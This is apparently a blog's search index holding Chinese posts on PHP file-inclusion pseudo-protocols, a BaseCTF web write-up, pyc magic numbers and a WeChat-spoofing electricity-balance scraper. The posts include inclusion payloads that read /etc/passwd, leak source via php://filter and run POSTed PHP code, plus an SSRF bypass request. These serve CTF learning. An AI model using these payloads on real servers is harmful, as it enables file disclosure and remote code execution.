<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2024/09/16/SSRF/"/>
    <url>/2024/09/16/SSRF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/2288231">web</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪协议与文件包含</title>
    <link href="/2024/09/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/09/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h3 id="前置学习要求"><a href="#前置学习要求" class="headerlink" title="前置学习要求"></a>前置学习要求</h3><h4 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h4><blockquote><p>文件包含所可能有的函数<br>php当中会造成文件包含漏洞的函数有：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file<br>实现方法</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span> ?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#GET数据</span><br><span class="hljs-number">2</span> ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  <span class="hljs-comment">#后面的base64字符是需要传入的字符串的base64编码</span><br><span class="hljs-number">3</span> ?file=php:<span class="hljs-comment">//input [POST DATA:]&lt;?php phpinfo()?&gt;  #POST数据</span><br><span class="hljs-number">4</span> ?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=xxx.php  #get读源码</span><br></code></pre></td></tr></table></figure><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><blockquote><p>需要开启allow_url_fopen的：php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory和php:&#x2F;&#x2F;temp<br>不需要开启allow_wrl_fopen的：php:&#x2F;&#x2F;filter<br>在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码<br>php:&#x2F;&#x2F;input需要post请求提交数据<br>php:&#x2F;&#x2F;filter可以get提交?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p></blockquote><h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?xxx=data:<span class="hljs-comment">//text/plain;base64,想要file_get_contents()函数返回的值的base64编码</span><br>?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><blockquote><p>File:&#x2F;&#x2F; 访问本地文件系统<br>file:&#x2F;&#x2F; 用于访问本地文件系统，如c:盘中的东西。在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。<br>file:&#x2F;&#x2F; [文件的绝对路径和文件名]<br>linux 系统环境下：?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>winows 系统环境下：?file&#x3D;file:&#x2F;&#x2F;&#x2F;E:\phpStudy\WWW\code\phpinfo.php</p></blockquote><p>总结：File协议用于读取系统文件，c盘关键内容。Php:&#x2F;&#x2F;filter 用来读取文件内容，但是要base64后出来，否则会造成文件执行从而只看到执行结果。Php:&#x2F;&#x2F;input（代码执行）可将post请求中的数据作为PHP代码执行。可以用于写木马。Data和input相似，可以代码执行，但只有在php&lt;5.3且include&#x3D;on时可以写木马。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basectfweb</title>
    <link href="/2024/09/15/Basectfweb/"/>
    <url>/2024/09/15/Basectfweb/</url>
    
    <content type="html"><![CDATA[<p>web初学者小写几个web题</p><h4 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h4><p>开启页面查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Aura 酱，欢迎回家~</span><br><span class="hljs-comment">// 这里有一份礼物，请你签收一下哟~</span><br><span class="hljs-variable">$pen</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pen&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pen</span>) !== <span class="hljs-string">&#x27;Aura&#x27;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span><br><span class="hljs-variable">$challenge</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$challenge</span>, <span class="hljs-string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这不是 Aura 的博客！&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$blog_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$challenge</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$blog_content</span>, <span class="hljs-string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="hljs-literal">false</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;请去博客里面写下感想哦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span><br><span class="hljs-variable">$gift</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gift&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$gift</span>);<br></code></pre></td></tr></table></figure><p>第一个判断，了解读取文件后的内容是Aura尝试data:&#x2F;&#x2F;为协议来读取<br>第二个判断利用了@的ssrf绕过<br>第三个采用了php伪协议的数据传输</p><pre><code class="hljs">POST / HTTP/1.1Host: challenge.basectf.fun:36145Cache-Control: max-age=0Accept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Length: 138Content-Type: application/x-www-form-urlencodedpen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@127.0.0.1&amp;gift=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>&lt;?php &#x2F;&#x2F; BaseCTF{81918213-ed45-40b9-b751-99e831a0bc75}  Aura 酱有拿到一血吗？</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pythonticke</title>
    <link href="/2024/09/15/pythonticke/"/>
    <url>/2024/09/15/pythonticke/</url>
    
    <content type="html"><![CDATA[<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">enum PycMagic &#123;<br>    MAGIC_1_0 = <span class="hljs-number">0x00999902</span>,<br>    MAGIC_1_1 = <span class="hljs-number">0x00999903</span>, /* Also covers <span class="hljs-number">1.2</span> */<br>    MAGIC_1_3 = <span class="hljs-number">0x0A0D2E89</span>,<br>    MAGIC_1_4 = <span class="hljs-number">0x0A0D1704</span>,<br>    MAGIC_1_5 = <span class="hljs-number">0x0A0D4E99</span>,<br>    MAGIC_1_6 = <span class="hljs-number">0x0A0DC4FC</span>,<br> <br>    MAGIC_2_0 = <span class="hljs-number">0x0A0DC687</span>,<br>    MAGIC_2_1 = <span class="hljs-number">0x0A0DEB2A</span>,<br>    MAGIC_2_2 = <span class="hljs-number">0x0A0DED2D</span>,<br>    MAGIC_2_3 = <span class="hljs-number">0x0A0DF23B</span>,<br>    MAGIC_2_4 = <span class="hljs-number">0x0A0DF26D</span>,<br>    MAGIC_2_5 = <span class="hljs-number">0x0A0DF2B3</span>,<br>    MAGIC_2_6 = <span class="hljs-number">0x0A0DF2D1</span>,<br>    MAGIC_2_7 = <span class="hljs-number">0x0A0DF303</span>,<br> <br>    MAGIC_3_0 = <span class="hljs-number">0x0A0D0C3A</span>,<br>    MAGIC_3_1 = <span class="hljs-number">0x0A0D0C4E</span>,<br>    MAGIC_3_2 = <span class="hljs-number">0x0A0D0C6C</span>,<br>    MAGIC_3_3 = <span class="hljs-number">0x0A0D0C9E</span>,<br>    MAGIC_3_4 = <span class="hljs-number">0x0A0D0CEE</span>,<br>    MAGIC_3_5 = <span class="hljs-number">0x0A0D0D16</span>,<br>    MAGIC_3_5_3 = <span class="hljs-number">0x0A0D0D17</span>,<br>    MAGIC_3_6 = <span class="hljs-number">0x0A0D0D33</span>,<br>    MAGIC_3_7 = <span class="hljs-number">0x0A0D0D42</span>,<br>    MAGIC_3_8 = <span class="hljs-number">0x0A0D0D55</span>,<br>    MAGIC_3_9 = <span class="hljs-number">0x0A0D0D61</span>,<br>    MAGIC_3_10 = <span class="hljs-number">0x0A0D0D6F</span>,<br>    MAGIC_3_11 = <span class="hljs-number">0x0A0D0DA7</span>,<br>    MAGIC_3_12 = <span class="hljs-number">0x0A0D0DCB</span>,<br> <br>    INVALID = <span class="hljs-number">0</span>,<br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>markdown语法</title>
    <link href="/2024/09/14/markdown%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/09/14/markdown%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs">languagekey1C1cActionScriptactionscriptApacheapacheAppleScriptapplescriptAsciiDocasciidocAspectJasciidocAutoHotkeyautohotkeyAVR AssembleravrasmAxaptaaxaptaBashbashBrainFuckbrainfuckCap’n ProtocapnprotoClojure REPLclojureClojureclojureCMakecmakeCoffeeScriptcoffeescriptC++cppC#csCSScssDdDartdDelphidelphiDiffdiffDjangodjangoDOS.batdosDustdustElixirelixirERB(Embedded Ruby)erbErlang REPLerlang-replErlangerlangFIXfixF#fsharpG-code(ISO 6983)gcodeGherkingherkinGLSLglslGogoGradlegradleGroovygroovyHamlhamlHandlebarshandlebarsHaskellhaskellHaxehaxeHTMLhtmlHTTPhttpIni fileiniJavajavaJavaScriptjavascriptJSONjsonLassolassoLesslessLisplispLiveCodelivecodeserverLiveScriptlivescriptLualuaMakefilemakefileMarkdownmarkdownMathematicamathematicaMatlabmatlabMEL (Maya Embedded Language)melMercurymercuryMizarmizarMonkeymonkeyNginxnginxNimrodnimrodNixnixNSISnsisObjective CobjectivecOCamlocamlOxygeneoxygeneParser 3parser3PerlperlPHPphpPowerShellpowershellProcessingprocessingPython’s profiler outputprofileProtocol BuffersprotobufPuppetpuppetPythonpythonQqRrRenderMan RIBribRoboconfroboconfRenderMan RSLrslRubyrubyOracle Rules LanguageruleslanguageRustrustScalascalaSchemeschemeScilabscilabSCSSscssSmalismaliSmallTalksmalltalkSMLsmlSQLsqlStatastataSTEP Part21(ISO 10303-21)step21StylusstylusSwiftswiftTcltclTextextexttext/plainThriftthriftTwigtwigTypeScripttypescriptValavalaVB.NETvbnetVBScript in HTMLvbscript-htmlVBScriptvbscriptVerilogverilogVHDLvhdlVim ScriptvimIntel x86 Assemblyx86asmXLxlXMLxmlYAMLyml</code></pre>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫初识</title>
    <link href="/2024/09/14/%E7%88%AC%E8%99%AB%E5%88%9D%E8%AF%86/"/>
    <url>/2024/09/14/%E7%88%AC%E8%99%AB%E5%88%9D%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>由于寝室老是没电导致我的电脑处于工作状态开机，气死我了，我便想用python来了解目前的电费是多少并给我发邮件，首先我们要了解一下基本的python发送响应包的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 发送 GET 请求</span><br>url = <span class="hljs-string">&#x27;https://example.com&#x27;</span>  <span class="hljs-comment"># 将此替换为你要访问的网址</span><br>response = requests.get(url)<br><br><span class="hljs-comment"># 检查请求是否成功</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求成功！&quot;</span>)<br>    <span class="hljs-comment"># 获取网页内容</span><br>    content = response.text  <span class="hljs-comment"># 返回HTML内容</span><br>    <span class="hljs-built_in">print</span>(content)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 发送 POST 请求</span><br>url = <span class="hljs-string">&#x27;https://example.com/api&#x27;</span>  <span class="hljs-comment"># 将此替换为实际的API URL</span><br>data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;your_username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;your_password&#x27;</span>&#125;  <span class="hljs-comment"># 传递的数据</span><br>response = requests.post(url, data=data)<br><br><span class="hljs-comment"># 检查请求是否成功</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;POST 请求成功！&quot;</span>)<br>    <span class="hljs-comment"># 获取响应内容</span><br>    <span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>在了解之后我们用bp抓包，发现一个问题，我们不再微信程序时网页会有一个自校验的情况，让我们在微信中打开，这无疑是我们不希望的不过我们可以修改我们的请求头部伪造我们在微信中的情景</p><p>这是在User agent 修改，这样服务端便会认为我们在微信中了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) &gt; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 &gt; Chrome/37.0.0.0 Mobile Safari/537.36 &gt; MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI<br></code></pre></td></tr></table></figure><p>下面是我们的请求报文</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">POST /app/app/api/user/searchBindHouseListForMoney HTTP/1.1<br>Host: xdxfdf.xtu.edu.cn<br>Content-Length: 58<br>Accept: application/json, text/javascript, */*; q=0.01<br>X-Requested-With: XMLHttpRequest<br>Accept-Language: zh-CN<br>User-Agent: Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) &gt; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 &gt; Chrome/37.0.0.0 Mobile Safari/537.36 &gt; MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>Origin: http://xdxfdf.xtu.edu.cn<br>Referer: http://xdxfdf.xtu.edu.cn/app/api/main/wxpay/payStepOne?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br>Accept-Encoding: gzip, deflate, br<br>Cookie: JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXX<br>Connection: keep-alive<br><br>wxId=XXXXXXXXXXXXXXXXXXX&amp;appId=XXXXXXXXXXXXXXXXXXXXXXX<br></code></pre></td></tr></table></figure><p>在python中的写法便是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-comment"># 请求的 URL</span><br>url = <span class="hljs-string">&quot;https://xdxfdf.xtu.edu.cn/app/app/api/user/searchBindHouseListForMoney&quot;</span><br>headers = &#123;<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;JSESSIONID=XXXXXXXXXXXXXXXXX&quot;</span>,<br>        &#125;<br>data = &#123;<br>    <span class="hljs-string">&quot;wxId&quot;</span>: <span class="hljs-string">&quot;XXXXXXXXXXXXX&quot;</span>,<br>    <span class="hljs-string">&quot;appId&quot;</span>: <span class="hljs-string">&quot;XXXXXXXXXXXXX&quot;</span>,<br>&#125;<br>response = requests.post(url, headers=headers,data=data)<br><span class="hljs-comment"># 检查响应状态码</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求成功！&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;响应内容:&quot;</span>, response.json())  <span class="hljs-comment"># 假设返回的内容是 JSON 格式</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;响应内容:&quot;</span>, response.text)<br></code></pre></td></tr></table></figure><p>可见重要的其实是cookie<br>我们的响应内容是(json转义后的)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>&#x27;data&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span>&#x27;customer_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">00116607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;house_id&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;meter&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span>&#x27;meter_status&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;customer_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">00116607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;sysId&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;wallet_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;house_addr&#x27;<span class="hljs-punctuation">:</span> &#x27;XXXX&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">64.18</span><span class="hljs-punctuation">,</span> &#x27;meter_type&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_balance_time&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">20240914225456</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;buy_time&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;free_balance&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;house_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;pay_type&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;customer_name&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">000017001111</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_id&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxxxxxxxxxxx&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> &#x27;house_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;wallet_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;house_addr&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;customer_name&#x27;<span class="hljs-punctuation">:</span> &#x27;XXXXXXXXXXXXX&#x27;<span class="hljs-punctuation">,</span> &#x27;pay_customer_flag&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">0</span>&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> &#x27;msg&#x27;<span class="hljs-punctuation">:</span> &#x27;&#x27;<span class="hljs-punctuation">,</span> &#x27;ret&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>成功获取我们要的报文后我们了解了在python中存在一个交SMTP的库，自带的竟然是,直接贴使用代码，看得更清楚些</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br> <br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-keyword">from</span> email.mime.text <span class="hljs-keyword">import</span> MIMEText<br><span class="hljs-keyword">from</span> email.header <span class="hljs-keyword">import</span> Header<br> <br><span class="hljs-comment"># 第三方 SMTP 服务</span><br>mail_host=<span class="hljs-string">&quot;smtp.XXX.com&quot;</span>  <span class="hljs-comment">#设置服务器</span><br>mail_user=<span class="hljs-string">&quot;XXXX&quot;</span>    <span class="hljs-comment">#用户名</span><br>mail_pass=<span class="hljs-string">&quot;XXXXXX&quot;</span>   <span class="hljs-comment">#口令 </span><br> <br> <br>sender = <span class="hljs-string">&#x27;from@runoob.com&#x27;</span><br>receivers = [<span class="hljs-string">&#x27;429240967@qq.com&#x27;</span>]  <span class="hljs-comment"># 接收邮件，可设置为你的QQ邮箱或者其他邮箱</span><br> <br>message = MIMEText(<span class="hljs-string">&#x27;Python 邮件发送测试...&#x27;</span>, <span class="hljs-string">&#x27;plain&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>message[<span class="hljs-string">&#x27;From&#x27;</span>] = Header(<span class="hljs-string">&quot;菜鸟教程&quot;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>message[<span class="hljs-string">&#x27;To&#x27;</span>] =  Header(<span class="hljs-string">&quot;测试&quot;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br>subject = <span class="hljs-string">&#x27;Python SMTP 邮件测试&#x27;</span><br>message[<span class="hljs-string">&#x27;Subject&#x27;</span>] = Header(subject, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br> <br><span class="hljs-keyword">try</span>:<br>    smtpObj = smtplib.SMTP() <br>    smtpObj.connect(smtp.qq.com, <span class="hljs-number">25</span>)    <span class="hljs-comment"># 25 为 SMTP端口号 456为ssh加密端口号</span><br>    smtpObj.login(mail_user,mail_pass)  <span class="hljs-comment">#用户的邮箱号，pass不是密码是SMTP授权号码</span><br>    smtpObj.sendmail(sender, receivers, message.as_string())<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;邮件发送成功&quot;</span><br><span class="hljs-keyword">except</span> smtplib.SMTPException:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error: 无法发送邮件&quot;</span><br></code></pre></td></tr></table></figure><p>我们需要开启qq邮箱的smtp服务,了解了<br><img src="https://gitee.com/fogpost/photo/raw/master/202409150023941.png" srcset="/img/loading.gif" lazyload><br>顺便贴一个From的格式我在这里卡住了。。。邮箱格式要正确呜呜呜<br><img src="https://gitee.com/fogpost/photo/raw/master/202409150023846.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crawler</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF202409</title>
    <link href="/2024/09/14/BaseCTF202409/"/>
    <url>/2024/09/14/BaseCTF202409/</url>
    
